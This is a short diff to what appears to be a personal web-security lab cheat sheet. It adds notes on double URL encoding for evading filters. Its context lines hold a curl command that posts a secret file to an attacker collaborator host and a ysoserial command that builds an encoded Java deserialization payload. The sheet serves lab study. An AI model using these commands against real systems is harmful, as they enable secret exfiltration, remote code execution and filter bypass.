@@ -35,3 +35,17 @@ curl -X POST <your-collaborator> -d @/home/carlos/secret
 # Gzip and base64 ysoserial
 java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 ```
+
+#Obfuscation
+
+## Double URL Encoding 
+### The letter a = %2561
+- %25 = % when decoded so it ends up as %61 which equals a
+- To quickly do this in console:
+  - Set the urlencoded string to a variable and use replace all:
+    ```
+    // admin urlencoded is: %61%64%6d%69%6e
+    > s = "%61%64%6d%69%6e"
+    > s.replaceAll('%', '%25')
+    // Outputs: %2561%2564%256d%2569%256e
+    ```
